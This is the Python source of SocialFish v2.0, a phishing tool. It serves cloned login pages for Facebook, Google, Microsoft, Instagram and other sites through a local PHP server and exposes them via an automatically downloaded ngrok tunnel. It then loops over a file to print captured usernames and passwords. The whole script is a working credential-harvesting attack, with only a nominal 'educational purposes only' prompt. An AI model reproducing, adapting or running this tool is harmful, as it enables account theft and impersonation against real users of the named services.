#-*- coding: utf-8 -*-
# Officially Written by Alisson Moretto
# kdhacker1995 --> Instagram, Microsoft Page
# ++++++++++++++++++++++++++++++++++++++++++++++++++

from time import sleep
from sys import stdout, exit
from os import system, path
import multiprocessing
from urllib import urlopen
from platform import system as systemos, architecture
from wget import download

RED, WHITE, CYAN, GREEN, END = '\033[91m', '\33[46m', '\033[36m', '\033[1;32m', '\033[0m'

def connected(host='http://duckduckgo.com'):
    try:
        urlopen(host)
        return True
    except:
        return False
if connected() == False:
     print '''
  ....._____.......     ____ ____ ____ _ ____ _       ____ _ ____ _  _ 
      /     \/|         [__  |  | |    | |__| |       |___ | [__  |__|
      \o__  /\|         ___] |__| |___ | |  | |___    |    | ___] |  |
          \|           
                    {0}[{1}!{0}]{1} Network error. Verify your connection.\n
'''.format(RED, END)
     exit(0)

def checkNgrok():
    if path.isfile('Server/ngrok') == False: 
        print '[*] Downloading Ngrok...'
        ostype = systemos().lower()
        if architecture()[0] == '64bit':
            filename = 'ngrok-stable-{0}-amd64.zip'.format(ostype)
        else:
            filename = 'ngrok-stable-{0}-386.zip'.format(ostype)
        url = 'https://bin.equinox.io/c/4VmDzA7iaHb/' + filename
        download(url)
        system('unzip ' + filename)
        system('mv ngrok Server/ngrok')
        system('rm -Rf ' + filename)
        system('clear')
checkNgrok()

def end():
    system('clear')
    print '''
                   S O C I A L{2} 
              (\    \ \ \ \ \ \ \      __      {0}+++++++++++++++++++++++++{2}    
             (  \    \ \ \ \ \ \ \   | O~-_    {0}+                       +{2}
            (     >----|-|-|-|-|-|-|--|  __/   {0}+  {3}Don't Kill My Fish{2}   {0}+{2}   
             (   /    / / / / / / /   |__\     {0}+      {3}KD_Hacx{2}          {0}+{2}   
              (/     / / / / / / /             {0}+                       +{2}
                          {1}F I S H{2}              {0}+++++++++++++++++++++++++{2}  


{1}[{0} Main Credit To : {1}Alisson Moretto | Twitter: @A1S0N_ | Github: @A1S0N ]

[{0} Add Instagram, Microsoft Page Credit : {1}kdhacker1995 | GitHub : @kdhacker1995 ]

{1}[{0} Official GitHub URL : {1}https://github.com/UndeadSec/SocialFish ]

[{0} kdhacker1995 GitHub Link : {1}https://github.com/kdhacker1995/ ]
 
          '''.format(GREEN, END, CYAN, RED)

def loadModule(module):
       print '''{0}			    
   _.-=-._     .-,   ,-.     _.-=-._ 	
 .'       "-.,' /    \ ',.-"	     '.	
(          _.  <      >  ._        0  )
 `=.____.="  `._\    /_.'  "=.____.='


 [{1}*{0}]{1} %s module loaded. Building site...{0}'''.format(CYAN, END) % module

def runPhishing(social, option2):
    system('sudo rm -Rf Server/www/*.* && touch Server/www/cat.txt')
    if option2 == '1' and social == 'Facebook':
        system('cp WebPages/fb_standard/*.* Server/www/')
    if option2 == '2' and social == 'Facebook':
        system('cp WebPages/fb_advanced_poll/*.* Server/www/')
    elif option2 == '1' and social == 'Google':
        system('cp WebPages/google_standard/*.* Server/www/')
    elif option2 == '2' and social == 'Google':
        system('cp WebPages/google_advanced_poll/*.* Server/www/')   
    elif social == 'LinkedIn':
        system('cp WebPages/linkedin/*.* Server/www/')
    elif social == 'Github':
        system('cp WebPages/github/*.* Server/www/')
    elif social == 'StackOverflow':
        system('cp WebPages/stackoverflow/*.* Server/www/')
    elif social == 'WordPress':
        system('cp WebPages/wordpress/*.* Server/www/')
    elif social == 'Twitter':
        system('cp WebPages/twitter/*.* Server/www/')
    elif social == 'Microsoft':
	system('cp WebPages/microsoft/*.* Server/www/')
    elif social == 'Instagram':
	system('cp WebPages/instagram/*.* Server/www/')

def waitCreds():
    print " {0}[{1}*{0}]{1} Waiting for credentials... \n".format(GREEN, END)
    while True:
        with open('Server/www/cat.txt') as creds:
            lines = creds.read().rstrip()
        if len(lines) != 0: 
            print ' {0}[ CREDENTIALS FOUND ]{1}:\n {0}%s{1}'.format(GREEN, END) % lines
            system('rm -rf Server/www/cat.txt && touch Server/www/cat.txt')
        creds.close()

def runPEnv():
    system('clear')
    print '''           
                   '      '	'
                        '   '	   '
               '       '   '    '        '
                 .  '  .        '   '                     '
             '             '      '                   '   '
  ███████ ████████ ███████ ██ ███████ ██       {0}███████ ██ ███████ ██   ██{1} 
  ██      ██    ██ ██      ██ ██   ██ ██       {0}██      ██ ██      ██   ██{1} 
  ███████ ██    ██ ██      ██ ███████ ██       {0}█████   ██ ███████ ███████{1} 
       ██ ██    ██ ██      ██ ██   ██ ██       {0}██      ██      ██ ██   ██{1} 
  ███████ ████████ ███████ ██ ██   ██ ███████  {0}██      ██ ███████ ██   ██{1} 
      .    '   '....'               ..'.      ' .
         '  .                     .     '          '     '  {3}v2.0{2} 
               '  .  .  .  .  . '.    .'              '  .
                     '         '    '. '   {0}Alisson Moretto         
 {0}Alisson Moretto    '       '      '       {0}Koushik Suthar         
 {0}Koushik Suthar       ' .  '		   
                             '
                             {1}'''.format(GREEN, END, CYAN, RED)

    for i in range(101):
        sleep(0.01)
        stdout.write("\r{0}[{1}*{0}]{1} Preparing environment... %d%%".format(CYAN, END) % i)
        stdout.flush()
   
    print "\n\n{0}[{1}*{0}]{1} Searching for PHP installation... ".format(CYAN, END) 
    if 256 != system('which php'):
        print " --{0}>{1} OK.".format(CYAN, END)
    else:
	print " --{0}>{1} PHP NOT FOUND: \n {0}*{1} Please install PHP and run me again. http://www.php.net/".format(RED, END)
        exit(0)
    if raw_input(" {0}[{1}!{0}]{1} Do you agree to use this tool for educational purposes only? (y/n)\n {2}SF > {1}".format(RED, END, CYAN)).upper() != 'Y':
        system('clear')
        print '\n[ {0}YOU ARE NOT AUTHORIZED TO USE THIS TOOL{1} ]\n'.format(RED, END)
        exit(0)
    option = raw_input("\nSelect an option:\n\n {0}[{1}1{0}]{1} Facebook\n\n {0}[{1}2{0}]{1} Google\n\n {0}[{1}3{0}]{1} LinkedIn\n\n {0}[{1}4{0}]{1} Github\n\n {0}[{1}5{0}]{1} StackOverflow\n\n {0}[{1}6{0}]{1} WordPress\n\n {0}[{1}7{0}]{1} Twitter\n\n {0}[{1}8{0}]{1} Microsoft\n\n {0}[{1}9{0}]{1} Instagram\n\n {0}SF >  {1}".format(CYAN, END))
    if option == '1':
        loadModule('Facebook')
        option2 = raw_input("\nOperation mode:\n\n {0}[{1}1{0}]{1} Standard Page Phishing\n\n {0}[{1}2{0}]{1} Advanced Phishing(poll_mode/login_with)\n\n {0}SF > {1}".format(CYAN, END))
        runPhishing('Facebook', option2)
    elif option == '2':
        loadModule('Google')
        option2 = raw_input("\nOperation mode:\n\n {0}[{1}1{0}]{1} Standard Page Phishing\n\n {0}[{1}2{0}]{1} Advanced Phishing(poll_mode/login_with)\n\n {0}SF > {1}".format(CYAN, END))
        runPhishing('Google', option2)
    elif option == '3':
        loadModule('LinkedIn')
        option2 = ''
        runPhishing('LinkedIn', option2)
    elif option == '4':
        loadModule('Github')
        option2 = ''
        runPhishing('Github', option2)
    elif option == '5':
        loadModule('StackOverflow')
        option2 = ''
        runPhishing('StackOverflow', option2)
    elif option == '6':
        loadModule('WordPress')
        option2 = ''
        runPhishing('WordPress', option2)
    elif option == '7':
        loadModule('Twitter')
        option2 = ''
        runPhishing('Twitter', option2)
    elif option == '8':
	loadModule('Microsoft')
	option2 = ''
	runPhishing('Microsoft', option2)
    elif option == '9':
	loadModule('Instagram')
	option2 = ''
	runPhishing('Instagram', option2)
    else:
        exit(0)

def runNgrok():
    system('./Server/ngrok http 80 > /dev/null &')
    sleep(10)
    system('curl -s -N http://127.0.0.1:4040/status | grep "https://[0-9a-z]*\.ngrok.io" -oh > ngrok.url')
    url = open('ngrok.url', 'r')
    print('\n {0}[{1}*{0}]{1} Ngrok URL: {2}' + url.read() + '{1}').format(CYAN, END, GREEN)
    url.close()

def runServer():
    system("cd Server/www/ && sudo php -S 127.0.0.1:80")

if __name__ == "__main__":
    try:
        runPEnv()
        runNgrok()
        multiprocessing.Process(target=runServer).start()
        waitCreds()
    except KeyboardInterrupt:
        system('pkill -f ngrok')
        end()
        exit(0)
